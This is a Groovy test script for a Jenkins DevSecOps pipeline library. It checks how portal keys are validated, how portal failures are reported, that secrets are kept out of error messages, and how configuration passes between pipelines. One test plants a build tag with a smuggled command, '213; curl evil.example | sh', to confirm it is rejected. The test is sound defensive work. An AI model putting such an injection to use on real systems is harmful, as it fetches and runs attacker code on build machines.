import devsecops.test.FakeCpsScript
import devsecops.test.FakeRemoteHandle
import devsecops.test.FakeScript
import devsecops.test.PortalFixtures
import devsecops.test.SandboxHarness
import groovy.json.JsonSlurperClassic
import org.yaml.snakeyaml.Yaml

File root = new File(args.length > 0 ? args[0] : '.').canonicalFile
File srcDir = new File(root, 'src')
File stubDir = new File(root, 'test/sandbox/stub')
File varsDir = new File(root, 'vars')

int failures = 0
Closure check = { String name, boolean ok, Object detail ->
    if (ok) {
        println "PASS  ${name}"
    } else {
        failures++
        println "FAIL  ${name}"
        if (detail) println "      ${detail}"
    }
}

Map gui = new JsonSlurperClassic().parseText(new File(root, 'test/fixtures/portal/certscanner-gui-full.json').text) as Map
Map backend = new JsonSlurperClassic().parseText(new File(root, 'test/fixtures/portal/certscanner-backend-api-full.json').text) as Map
Yaml yaml = new Yaml()
String securityJob = 'DevSecOps/CertScanner/security'

Closure changed = { Map document, Map pipeline ->
    Map copy = PortalFixtures.copy(document)
    (copy.pipeline as Map).putAll(pipeline)
    return copy
}

Closure jenkins = { Map env ->
    FakeScript j = new FakeScript()
    j.resourcesDir = new File(root, 'resources')
    j.env.vars.putAll([BUILD_NUMBER: '42', JOB_NAME: 'DevSecOps/CertScanner', DSO_PORTAL_URL: PortalFixtures.PORTAL_URL])
    (env ?: [:]).each { k, v -> if (v == null) j.env.vars.remove(k) else j.env.vars.put(k as String, v as String) }
    return j
}

Closure failureOf = { Throwable t -> SandboxHarness.rejectionOf(t) ?: t.message ?: t.toString() }

Closure load = { FakeScript j, String variant, Map jenkinsfile ->
    SandboxHarness harness = new SandboxHarness(srcDir, stubDir)
    def state = null
    def loader = null
    String error = ''
    try {
        harness.run {
            state = harness.type('com.bbh.core.PipelineState').newInstance()
            loader = harness.type('com.bbh.config.ConfigLoader').newInstance(j, state)
            loader.load(variant, jenkinsfile)
        }
    } catch (Throwable t) {
        error = failureOf(t)
    }
    return [harness: harness, state: state, loader: loader, error: error]
}

Closure initialize = { Map r ->
    try {
        (r.harness as SandboxHarness).run { r.loader.initialize() }
        return ''
    } catch (Throwable t) {
        return failureOf(t)
    }
}

Closure querySh = { FakeScript j -> j.calls.find { it.startsWith('sh [Read the configuration from the DevSecOps portal] ') } as String }

FakeScript j = jenkins([:])
Map<String, Object> globals = new SandboxHarness(srcDir, stubDir).loadVars(varsDir, j)
FakeCpsScript entryPoint = globals['devSecOpsPipeline'] as FakeCpsScript
String crash = ''
try {
    new SandboxHarness(srcDir, stubDir).run { entryPoint.call([:]) }
} catch (Throwable t) {
    crash = failureOf(t)
}
check('no key: the entry point fails before pipeline {} with the call to write and the portal',
        crash.contains("devSecOpsPipeline(pipelineKey: '<key from the DevSecOps portal>')") && crash.contains('DevSecOps portal')
                && entryPoint.executedStages.isEmpty() && !j.files.containsKey('report/pipeline-report.html') && j.calls.isEmpty(),
        "${crash} | stages ${entryPoint.executedStages} | calls ${j.calls}")

j = jenkins([:])
Map r = load(j, 'full', [pipelineKey: 'cert-scanner-gui'])
check('malformed key: refused before anything runs', r.error.contains('is not a key of the DevSecOps portal') && j.calls.isEmpty(),
        "${r.error} | ${j.calls}")

j = jenkins([:])
r = load(j, 'full', [pipelineKey: PortalFixtures.key(1)])
check('unknown key: not issued by the portal, shown only as a hint',
        r.error == "[PORTAL] Key ${PortalFixtures.hint(PortalFixtures.key(1))} was not issued by the DevSecOps portal at ${PortalFixtures.PORTAL_URL}".toString(), r.error)

j = jenkins([:])
j.portal[PortalFixtures.key(1)] = [keyStatus: 'REVOKED', revokeReason: 'service moved to the Payments team', renderedAt: PortalFixtures.RENDERED_AT, sha256: PortalFixtures.sha256(1)]
r = load(j, 'full', [pipelineKey: PortalFixtures.key(1)])
check('revoked key: the reason is shown with what to do',
        r.error.contains('was invalidated in the DevSecOps portal (The DevSecOps pipeline key was invalidated on 2026-10-06T08:14:19.475Z: service moved to the Payments team); regenerate it in the portal and put the new key in the Jenkinsfile')
                && !r.error.contains(PortalFixtures.key(1)),
        r.error)

j = jenkins([:])
j.portalAnswer = [status: '200', sha256: PortalFixtures.sha256(1), body: '{}']
r = load(j, 'full', [pipelineKey: PortalFixtures.key(1)])
check('empty answer: the portal sent no configuration, the build stops', r.error.contains("the answer for key ${PortalFixtures.hint(PortalFixtures.key(1))} holds no configuration"), r.error)

j = jenkins([:])
String securityKey = PortalFixtures.publish(j, changed(gui, [type: 'security']))
r = load(j, 'full', [pipelineKey: securityKey])
check('type mismatch: names the type of the key and the type of the entry point',
        r.error.contains('configures a security pipeline') && r.error.contains('runs the full pipeline'), r.error)

j = jenkins([:])
List<String> keys = [PortalFixtures.publish(j, gui), PortalFixtures.publish(j, changed(backend, [product: 'PAYHUB']))]
r = load(j, 'full', [pipelineKeys: keys])
check('product mismatch: names both products', r.error.contains('belongs to product PAYHUB') && r.error.contains('to product CERTSCANNER'), r.error)

j = jenkins([:])
keys = [PortalFixtures.publish(j, gui), PortalFixtures.publish(j, gui)]
r = load(j, 'full', [pipelineKeys: keys])
check('duplicate service: names the keys and the service', r.error.contains('both configure service gui'), r.error)

j = jenkins([:])
keys = [PortalFixtures.publish(j, backend), PortalFixtures.publish(j, gui)]
r = load(j, 'full', [pipelineKeys: [' ' + keys[0].toUpperCase() + ' ', keys[1]], projectNames: 'gui', agentNames: ['windows-agent']])
String initError = r.error ? '' : initialize(r)
Map runState = j.files['pipeline-config.yaml'] ? yaml.load(j.files['pipeline-config.yaml']) as Map : [:]
check('several keys: the first key is the primary project and the order is kept everywhere',
        !r.error && !initError && j.env.PROJECT_NAMES == 'backend-api,gui' && r.state.currentProjectName == 'backend-api'
                && (r.state.projectsAllCfg as Map).keySet().toList() == ['backend-api', 'gui']
                && ((runState.projects ?: [:]) as Map).keySet().toList() == ['backend-api', 'gui']
                && j.env.vars.get('DSO_PORTAL_KEYS') == null && querySh(j) != null,
        "${r.error} ${initError} ${j.env.PROJECT_NAMES} ${r.state.currentProjectName}")
check('several keys: the merged configuration is the global defaults under each service, as defaults.yaml under config.yaml was',
        (r.state.projectsAllCfg.gui as Map).sast?.pollTimeoutMin == 50 && (r.state.projectsAllCfg.gui as Map).sast?.scanName == 'cert-scanner-gui-sast'
                && (r.state.cfgDefaults as Map).coverage?.minLine == 60 && r.state.platform?.iosBuildAgent == 'mac002.bbh.com',
        r.state.projectsAllCfg.gui)
Closure portalLine = { String key, String services, String sha ->
    j.log.any { String line ->
        String prefix = "[PORTAL] key ${PortalFixtures.hint(key)}: ${services} of CERTSCANNER, rendered ".toString()
        String suffix = ", sha256 ${sha}".toString()
        (line.startsWith(prefix) && line.endsWith(suffix)
                && (line.substring(prefix.length(), line.length() - suffix.length()) ==~ /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z/))
    }
}
check('several keys: one [PORTAL] line per key and one for the ignored Jenkinsfile keys',
        portalLine(keys[0], 'backend-api', PortalFixtures.sha256(1)) && portalLine(keys[1], 'gui', PortalFixtures.sha256(2))
                && j.log.contains('[PORTAL] The Jenkinsfile sets projectNames, agentNames; the values from the DevSecOps portal are used instead'),
        j.log.findAll { it.startsWith('[PORTAL]') })

j = jenkins([:])
SandboxHarness apiHarness = new SandboxHarness(srcDir, stubDir)
FakeCpsScript api = apiHarness.loadVars(varsDir, j)['devSecOpsApi'] as FakeCpsScript
String apiError = ''
try {
    apiHarness.run { api.initialize() }
} catch (Throwable t) {
    apiError = failureOf(t)
}
check('initialize() without configure() names configure() and the portal',
        apiError.contains("devSecOpsApi.configure('<variant>', [pipelineKey: '<key from the DevSecOps portal>'])") && apiError.contains('before devSecOpsApi.initialize()'),
        apiError)

j = jenkins([PROXY_HOST: 'agent-proxy.bbh.com'])
Map platformDoc = PortalFixtures.copy(gui)
Map environment = (platformDoc.platform as Map).environment as Map
environment.PROXY_HOST = 'portal-proxy.bbh.com'
environment.PROXY_PORT = 8080
environment.remove('PROXY_USER')
String platformKey = PortalFixtures.publish(j, platformDoc)
apiHarness = new SandboxHarness(srcDir, stubDir)
api = apiHarness.loadVars(varsDir, j)['devSecOpsApi'] as FakeCpsScript
apiError = ''
Map pipelineConfig = [:]
try {
    apiHarness.run {
        api.configure('full', [pipelineKey: platformKey, appId: 'from-the-jenkinsfile'])
        pipelineConfig = api.pipelineConfig() as Map
        j.onAgent('linux-agent') { api.initialize() }
    }
} catch (Throwable t) {
    apiError = failureOf(t)
}
check('platform values: an agent-level PROXY_HOST wins over the portal, the portal wins over the literal, the literal is the fallback',
        !apiError && j.env.PROXY_HOST == 'agent-proxy.bbh.com' && j.env.PROXY_PORT == '8080' && j.env.PROXY_USER == 'PROXY_ASOCJenk'
                && j.env.APPSCAN_SERVER_URL == 'https://bbh.cloud.appscan.com',
        "${apiError} PROXY_HOST=${j.env.PROXY_HOST} PROXY_PORT=${j.env.PROXY_PORT} PROXY_USER=${j.env.PROXY_USER}")
check('configure(): the AGENT_NAME choices come from the portal and the Jenkinsfile map stays available',
        pipelineConfig.agentNames == ['linux-agent'] && pipelineConfig.appId == 'from-the-jenkinsfile' && pipelineConfig.projectNames == 'gui',
        pipelineConfig.findAll { k, v -> k != 'pipelineKey' })

j = jenkins([DSO_PORTAL_URL: null, DSO_PORTAL_DB_URL: 'jdbc:oracle:thin:@//portal-db.bbh.com:1521/DSOPORTAL'])
r = load(j, 'full', [pipelineKey: PortalFixtures.publish(j, gui)])
check('missing DSO_PORTAL_URL: says where to set it, nothing runs, the old database URL is ignored',
        r.error.contains('DSO_PORTAL_URL is not set') && r.error.contains('Global properties') && j.calls.isEmpty(), r.error)

['https://reader:s3cret@dso-portal.apps.bbh.com', 'jdbc:oracle:thin:@//portal-db.bbh.com:1521/DSOPORTAL',
 'https://dso-portal.apps.bbh.com/?token=s3cret', 'dso-portal.apps.bbh.com'].each { String url ->
    FakeScript s = jenkins([DSO_PORTAL_URL: url])
    Map result = load(s, 'full', [pipelineKey: PortalFixtures.publish(s, gui)])
    check("DSO_PORTAL_URL ${url.replace('s3cret', '***')}: refused before anything runs, the value is never repeated",
            result.error.contains('DSO_PORTAL_URL is not the address of the DevSecOps portal') && !result.error.contains('s3cret')
                    && !result.error.contains('portal-db') && s.calls.isEmpty(),
            result.error)
}

j = jenkins([DSO_PORTAL_URL: 'https://dso-portal.apps.bbh.com/'])
r = load(j, 'full', [pipelineKey: PortalFixtures.publish(j, gui)])
check('DSO_PORTAL_URL with a trailing slash: the slash is dropped before the read',
        !r.error && j.calls.any { it.startsWith('withEnv ') && it.contains('DSO_PORTAL_URL=https://dso-portal.apps.bbh.com,') }, "${r.error} | ${j.calls}")

[[name: 'unreachable portal', answer: [status: '000', error: "curl: (7) Failed to connect to dso-portal.apps.bbh.com port 443 after 3 ms: Couldn't connect to server\n" * 2
        + "curl: (28) Failed to connect to dso-portal.apps.bbh.com port 443 after 10002 ms: Timeout was reached\n"],
  text: "agent build-agent-7 cannot reach it (curl: (28) Failed to connect to dso-portal.apps.bbh.com port 443 after 10002 ms: Timeout was reached)"],
 [name: 'untrusted certificate', answer: [status: '000', error: 'curl: (60) SSL certificate problem: unable to get local issuer certificate\nMore details here: https://curl.se/docs/sslcerts.html\n\ncurl failed to verify the legitimacy of the server\n'],
  text: 'cannot reach it (curl: (60) SSL certificate problem: unable to get local issuer certificate)'],
 [name: 'router without a portal behind it', answer: [status: '503', body: '<html><body>Application is not available</body></html>'],
  text: 'it answered HTTP 503;'],
 [name: 'wrong address', answer: [status: '404', body: '{"timestamp":"2026-10-06T08:14:19Z","status":404,"error":"Not Found","path":"/api/dso/config"}'],
  text: 'it answered HTTP 404;'],
 [name: 'portal failure', answer: [status: '500', body: FakeScript.problem('<key>', 500, 'Request failed', "The portal could not handle the request. The failure is in the portal's log.")],
  text: "it answered HTTP 500 (The portal could not handle the request. The failure is in the portal's log.)"]
].each { Map spec ->
    FakeScript s = jenkins([NODE_NAME: 'build-agent-7', WORKSPACE: '/agent/ws'])
    s.portalAnswer = spec.answer
    Map result = load(s, 'full', [pipelineKey: PortalFixtures.publish(s, gui)])
    check("portal ${spec.name}: one message with the cause, the portal address and the DevSecOps team, the build description says the portal is unavailable",
            result.error.contains(spec.text as String) && result.error.contains("from the DevSecOps portal at ${PortalFixtures.PORTAL_URL}: ")
                    && result.error.endsWith('ask the DevSecOps team') && !result.error.contains('<html>')
                    && s.currentBuild.description == 'DevSecOps portal unavailable',
            "${result.error} | description ${s.currentBuild.description}")
}

j = jenkins([:])
String leakedKey = PortalFixtures.publish(j, gui)
j.portalAnswer = [status: '000', error: "curl: (28) Failed to read ${PortalFixtures.PORTAL_URL}/api/dso/config/${leakedKey}?format=json\n".toString()]
r = load(j, 'full', [pipelineKey: leakedKey])
check('an error text that holds the key shows only its hint', r.error.contains(PortalFixtures.hint(leakedKey)) && !r.error.contains(leakedKey), r.error)

j = jenkins([:])
j.portalAnswer = [status: '200', body: 'Picked up _JAVA_OPTIONS {']
r = load(j, 'full', [pipelineKey: PortalFixtures.publish(j, gui)])
check('broken answer: only its length is printed', r.error.contains('is not JSON (25 characters)') && !r.error.contains('Picked up'), r.error)

j = jenkins([DSO_PORTAL_AGENT: 'portal-reader && linux'])
j.unix = false
r = load(j, 'full', [pipelineKey: PortalFixtures.publish(j, gui)])
check('Windows bootstrap agent: refused with the setting to change',
        r.error.contains('set DSO_PORTAL_AGENT to a Linux or macOS label') && j.calls.contains('node portal-reader && linux') && querySh(j) == null,
        "${r.error} | ${j.calls}")

j = jenkins([:])
r = load(j, 'full', [pipelineKey: PortalFixtures.publish(j, gui)])
check('configure() outside a node reads on an agent of DSO_PORTAL_AGENT, default linux-agent',
        !r.error && j.calls.contains('node linux-agent') && querySh(j) != null, j.calls.findAll { !it.startsWith('sh ') })

j = jenkins([NODE_NAME: 'build-agent-7', WORKSPACE: '/agent/ws'])
String inPlaceKey = PortalFixtures.publish(j, gui)
r = load(j, 'full', [pipelineKey: inPlaceKey])
String script = (querySh(j) ?: '').substring('sh [Read the configuration from the DevSecOps portal] '.length())
String withEnv = j.calls.find { it.startsWith('withEnv ') } ?: ''
check('configure() inside a node reads in place, in a per-build directory below the workspace tmp, without credentials',
        !r.error && !j.calls.any { it.startsWith('node ') || it.startsWith('withCredentials') } && withEnv.contains('DSO_PORTAL_DIR=/agent/ws@tmp/dso-portal-42')
                && j.calls.contains('deleteDir /agent/ws@tmp/dso-portal-42') && !j.files.keySet().any { it.contains('dso-portal-42') },
        "${r.error} | ${j.calls.findAll { !it.startsWith('sh ') }}")
check('the query script is constant: #!/bin/sh, set +x, no key, one GET per key with retries, the key only in the environment',
        script.startsWith('#!/bin/sh\nset +x\n') && !script.contains(inPlaceKey) && !script.contains('dso-portal-42') && !script.contains('dso-portal.apps')
                && script.contains('"$DSO_PORTAL_URL/api/dso/config/$key?format=json"') && script.contains('--retry 2') && !script.contains('-X ')
                && withEnv.contains("DSO_PORTAL_KEYS=${inPlaceKey}") && withEnv.contains("DSO_PORTAL_URL=${PortalFixtures.PORTAL_URL}"),
        script)

Map extendedGui = changed(gui, [type: 'extended', securityPipeline: securityJob])
Map extendedBackend = changed(backend, [type: 'extended', securityPipeline: securityJob])
Map copied = [projects: [gui: [appId: 'taken-from-the-security-run', delivery: '57-20261006-081500'],
                         'backend-api': [deploy: [openshift: [rd: [buildTag: '213-20261006-081500', projectBuildR: 'elsewhere',
                                                                   internalDockerUrl: 'image-registry.openshift-image-registry.svc:5000/ta-certscanner-build/certscanner-api@sha256:5f1c0ffee']]]]]]

j = jenkins([:])
keys = [PortalFixtures.publish(j, extendedGui), PortalFixtures.publish(j, extendedBackend)]
j.files['pipeline-config.yaml'] = yaml.dump(copied)
r = load(j, 'extended', [pipelineKeys: keys])
initError = r.error ?: initialize(r)
runState = j.files['pipeline-config.yaml'] ? yaml.load(j.files['pipeline-config.yaml']) as Map : [:]
Map backendRd = ((((r.state.projectsAllCfg as Map)['backend-api'] as Map)?.deploy as Map)?.openshift as Map)?.rd as Map
check('extended handoff: only the run-time tags of the security run are laid over the own documents',
        !initError && j.env.Security_Pipeline == securityJob && (r.state.projectsAllCfg.gui as Map).delivery == '57-20261006-081500'
                && (r.state.projectsAllCfg.gui as Map).appId == '209f44ac-dd06-4ca0-884e-d944904f8020'
                && backendRd?.buildTag == '213-20261006-081500' && (backendRd?.internalDockerUrl as String)?.endsWith('@sha256:5f1c0ffee')
                && backendRd?.projectBuildR == 'ta-certscanner-build',
        "${initError} | ${backendRd}")
check('extended handoff: the extended run writes its own run-state file with the overlay',
        ((runState.projects as Map)?.gui as Map)?.delivery == '57-20261006-081500' && ((runState.projects as Map)?.gui as Map)?.appId == '209f44ac-dd06-4ca0-884e-d944904f8020',
        runState.projects?.gui)

j = jenkins([:])
r = load(j, 'extended', [pipelineKeys: [PortalFixtures.publish(j, extendedGui)]])
initError = r.error ?: initialize(r)
check('extended handoff: a security build from before the portal integration says what to run',
        initError == "[INIT] The last successful build of ${securityJob} has no pipeline-config.yaml: it predates the DevSecOps portal integration; run ${securityJob} once".toString(),
        initError)

j = jenkins([:])
j.files['pipeline-config.yaml'] = yaml.dump([projects: [payments: [delivery: '12-20261006-081500']]])
r = load(j, 'extended', [pipelineKeys: [PortalFixtures.publish(j, extendedGui)]])
initError = r.error ?: initialize(r)
check('extended handoff: a security pipeline that builds other services is refused',
        initError == "[INIT] Security pipeline ${securityJob} builds payments, this key builds gui".toString(), initError)

j = jenkins([:])
j.files['pipeline-config.yaml'] = yaml.dump([projects: ['backend-api': [deploy: [openshift: [rd: [buildTag: '213; curl evil.example | sh']]]]]])
r = load(j, 'extended', [pipelineKeys: [PortalFixtures.publish(j, extendedBackend)]])
initError = r.error ?: initialize(r)
check('extended handoff: a tag that is not a plain tag is refused before any step uses it',
        initError.contains('pipeline-config.yaml of DevSecOps/CertScanner/security holds an invalid deploy.openshift.rd.buildTag for backend-api'), initError)

j = jenkins([:])
Map standalone = changed(backend, [type: 'extended'])
((((standalone.projects as Map)['backend-api'] as Map).deploy as Map).openshift as Map).rd.buildTag = '200-20260901-000000'
r = load(j, 'extended', [pipelineKeys: [PortalFixtures.publish(j, standalone)]])
initError = r.error ?: initialize(r)
check('standalone extended pipeline: no copy, its own documents with the pinned tag',
        !initError && !j.env.Security_Pipeline && !j.calls.any { it.startsWith('copyArtifacts') }
                && ((((r.state.projectsAllCfg as Map)['backend-api'] as Map).deploy as Map).openshift as Map).rd.buildTag == '200-20260901-000000'
                && j.files.containsKey('pipeline-config.yaml'),
        initError)

j = jenkins([:])
SandboxHarness buildHarness = new SandboxHarness(srcDir, stubDir)
List<Map> triggered = []
j.steps['triggerRemoteJob'] = { Map a -> triggered << a; new FakeRemoteHandle(buildResult: 'SUCCESS', buildUrl: 'https://jenkins-b.bbh.com/job/smoke/12/') }
String buildError = ''
try {
    buildHarness.run {
        def state = buildHarness.type('com.bbh.core.PipelineState').newInstance()
        def os = buildHarness.type('com.bbh.core.OsHelper').newInstance(j)
        def policy = buildHarness.type('com.bbh.core.PolicyEngine').newInstance(j, state, os)
        def build = buildHarness.type('com.bbh.build.BuildService').newInstance(j, state, os, policy)
        build.runSingleTestJob('Smoke tests', [name: 'login smoke', type: 'remote', job: 'https://jenkins-b.bbh.com/job/smoke/job/login',
                                               tokenCredentialsId: 'cert-scanner-remote-token', credentialsId: 'remote-jenkins-api-token'], 0, 15)
        build.runSingleTestJob('Smoke tests', [name: 'legacy smoke', type: 'remote', job: 'https://jenkins-b.bbh.com/job/smoke/job/legacy', token: 'plain-token'], 1, 15)
    }
} catch (Throwable t) {
    buildError = failureOf(t)
}
check('remote test jobs: tokenCredentialsId is bound from Jenkins credentials, a plain token still works',
        !buildError && triggered.size() == 2 && triggered[0].token == 'fake-REMOTE_JOB_TOKEN' && triggered[1].token == 'plain-token'
                && j.calls.count('withCredentials [cert-scanner-remote-token]') == 1 && j.env.REMOTE_JOB_TOKEN == null,
        "${buildError} | ${triggered.collect { it.token }} | ${j.calls}")

println "\n${failures == 0 ? 'ALL PORTAL SCENARIOS PASSED' : failures + ' PORTAL SCENARIO CHECK(S) FAILED'}"
System.exit(failures == 0 ? 0 : 1)
